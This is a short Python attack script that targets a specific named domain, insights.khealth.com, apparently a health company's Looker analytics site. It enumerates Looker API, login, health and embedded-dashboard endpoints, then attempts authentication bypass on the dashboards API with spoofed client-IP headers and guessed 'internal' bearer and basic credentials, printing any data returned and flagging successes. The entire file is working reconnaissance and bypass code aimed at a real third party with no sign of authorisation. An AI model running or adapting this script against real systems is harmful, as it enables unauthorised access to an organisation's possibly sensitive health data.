#!/usr/bin/env python3
import requests
import json

print("[*] Testing Google Cloud Looker Vulnerabilities\n")

base = "https://insights.khealth.com"

# Looker endpoints that might be unauthenticated
looker_endpoints = [
    "/api/3.0/lookml_models",
    "/api/3.0/dashboards",
    "/api/3.0/looks",
    "/api/3.0/queries",
    "/api/3.0/spaces",
    "/api/3.0/projects",
    "/login",
    "/account/login",
    "/signin",
    "/_health",
    "/internal/health",
    "/api/internal/health",
    "/version",
    "/api/version",
]

print("[*] Testing Looker API endpoints...\n")

for endpoint in looker_endpoints:
    try:
        r = requests.get(f"{base}{endpoint}", timeout=5, allow_redirects=False)
        if r.status_code < 500:
            print(f"[{r.status_code}] {endpoint}")
            if r.status_code < 400 and len(r.text) < 500:
                print(f"    Response: {r.text[:150]}")
    except Exception as e:
        pass

# Test for Looker auth bypass vulnerabilities
print("\n[*] Testing Looker Auth Bypass Techniques...\n")

bypass_headers = [
    {"X-Forwarded-For": "127.0.0.1"},
    {"X-Real-IP": "127.0.0.1"},
    {"X-Originating-IP": "[127.0.0.1]"},
    {"CF-Connecting-IP": "127.0.0.1"},
    {"True-Client-IP": "127.0.0.1"},
    {"Authorization": "Bearer internal"},
    {"Authorization": "Basic aW50ZXJuYWw6aW50ZXJuYWw="},
]

for headers in bypass_headers:
    try:
        r = requests.get(f"{base}/api/3.0/dashboards", headers=headers, timeout=5)
        print(f"Headers {headers}: {r.status_code}")
        if r.status_code == 200:
            print(f"  ✅ VULNERABILITY FOUND!")
            print(f"  Response: {r.text[:300]}")
    except:
        pass

# Test embedded dashboard access (Looker specific)
print("\n[*] Testing Embedded Looker Dashboards...\n")

embedded_paths = [
    "/embed/dashboards",
    "/embed/looks",
    "/embedded/dashboards",
    "/share/dashboards",
    "/public/dashboards",
    "/dashboards",
]

for path in embedded_paths:
    try:
        r = requests.get(f"{base}{path}", timeout=5, allow_redirects=False)
        if r.status_code < 400:
            print(f"[{r.status_code}] {path}")
    except:
        pass

